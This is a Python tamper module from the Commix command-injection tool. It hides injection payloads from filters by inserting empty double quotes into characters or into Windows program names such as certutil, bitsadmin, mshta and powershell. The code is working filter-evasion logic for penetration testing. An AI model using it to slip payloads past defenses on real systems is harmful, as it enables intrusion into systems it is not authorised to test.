#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

import re
from src.utils import settings
from src.core.controller import checks

"""
About: Adds double quotes (") between the characters in a given payload.
Notes: On Windows targets only the names of the programs a payload calls are broken up (see below).
"""

__tamper__ = "doublequotes"
__priority__ = settings.PRIORITY.BELOW_NORMAL

# Why this script cannot be applied to the target at hand, or nothing where it can.
def dependencies():
  return checks.tamper_dep_eval_incompatible(__tamper__)

if not settings.TAMPER_SCRIPTS[__tamper__]:
  obf_char = '""'
  settings.TAMPER_SCRIPTS[__tamper__] = True

"""
The programs a Windows payload calls by name.

cmd.exe drops a pair of quotes while it resolves a program name - inside the quotes of a
'cmd /c "..."' as well - so 'w""hoami' still runs. Its own keywords and internal commands are
matched before that happens ('s""et' and 'e""cho' are not commands at all), and a 'for /f' option
is read as the literal string it is quoted as, so nothing but these names is touched.
"""
WINDOWS_PROGRAMS = ("cmd", "powershell", "nslookup", "certutil", "curl", "wget", "whoami",
                    "hostname", "ipconfig", "getmac", "netstat", "route", "arp", "net",
                    "systeminfo", "tasklist", "wmic", "reg", "sc", "schtasks", "bitsadmin",
                    "mshta", "rundll32", "findstr", "find", "more", "sort", "attrib", "icacls")

# Put empty double quotes between the characters, which the shell drops.
def tamper(payload):
  # The quotes themselves, added only where they are not inside a quoted word already.
  def obfuscate(text):
    return re.sub(settings.TAMPER_MODIFICATION_LETTERS, obf_char + r"\1", text)

  if settings.TARGET_OS == settings.OS.WINDOWS:
    # The first letter is left alone: a name already inside quotes would otherwise start on three
    # of them, which cmd.exe reads as a quote of its own rather than as nothing.
    def obfuscate_program(match):
      name = match.group(0)
      return name[:1] + obfuscate(name[1:])

    for program in WINDOWS_PROGRAMS:
      # Bounded on letters only, since a payload's own separator ('%26') runs into the name. The
      # match itself is broken up, so a name written in another case stays in it.
      payload = re.sub(r"(?<![A-Za-z])" + program + r"(?![A-Za-z])", obfuscate_program,
                       payload, flags=re.IGNORECASE)
    return payload

  return checks.tamper_restore_ignored_words(obfuscate(payload), obf_char)

# eof
